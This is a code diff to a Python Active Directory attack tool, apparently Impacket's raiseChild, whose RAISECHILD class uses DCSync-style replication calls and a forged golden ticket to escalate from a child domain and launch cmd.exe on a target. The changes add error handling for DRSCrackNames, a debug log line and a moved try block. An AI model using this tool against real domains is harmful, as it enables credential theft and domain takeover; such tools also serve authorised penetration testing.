@@ -998,10 +998,13 @@ class RAISECHILD:
             crackedName = self.DRSCrackNames(domain, drsuapi.DS_NAME_FORMAT.DS_USER_PRINCIPAL_NAME, name = upn, creds=creds)
 
             if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
-                userRecord = self.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1], creds)
-                #userRecord.dump()
-                if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
-                    raise Exception('DRSGetNCChanges didn\'t return any object!')
+                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] == 0:
+                    userRecord = self.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1], creds)
+                    #userRecord.dump()
+                    if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
+                        raise Exception('DRSGetNCChanges didn\'t return any object!')
+                else:
+                    raise Exception('DRSCrackNames status returned error 0x%x' % crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
             else:
                 raise Exception('DRSCrackNames returned %d items for user %s' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
 
@@ -1286,6 +1289,7 @@ class RAISECHILD:
             else:
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
             try:
+                logging.debug('Getting TGS for SPN %s' % serverName)
                 tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, childCreds['domain'], None, goldenTicket, cipher, sessionKey)
                 TGS['KDC_REP'] = tgsCIFS
                 TGS['cipher'] = cipherCIFS
@@ -1424,9 +1428,8 @@ if __name__ == '__main__':
 
     commands = 'cmd.exe'
 
-    pacifier = RAISECHILD(options.target_exec, username, password, domain, options, commands)
-
     try:
+        pacifier = RAISECHILD(options.target_exec, username, password, domain, options, commands)
         pacifier.exploit()
     except SessionError, e:
         logging.critical(str(e))
